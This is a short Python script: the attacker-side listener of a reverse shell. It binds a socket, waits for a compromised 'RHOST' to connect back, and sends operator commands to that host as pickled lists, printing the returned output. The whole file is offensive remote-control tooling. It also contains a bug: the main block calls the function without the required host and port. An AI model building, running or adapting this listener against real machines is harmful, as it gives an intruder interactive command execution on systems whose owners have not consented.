import socket, pickle

def reverseShell(HOST,PORT):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST,PORT))
            s.listen()
            conn, addr = s.accept()
            with conn:
                print("\033[32m[+]\033[0m Connected to RHOST!")

                while True:
                    
                    uInput = input("shell\033[32m$\033[0m")

                    if uInput == "exit":
                        break
                    else:
                        cmd = [uInput, ""]

                    cmd2 = pickle.dumps(cmd)
                    conn.sendall(cmd2)

                    data = conn.recv(4096)
                    print("\033[32m[+]\033[0m STDOUT recieved:\n", data.decode(errors="ignore"))
    except KeyboardInterrupt:
        s.close()

if __name__ == "__main__":
    reverseShell()
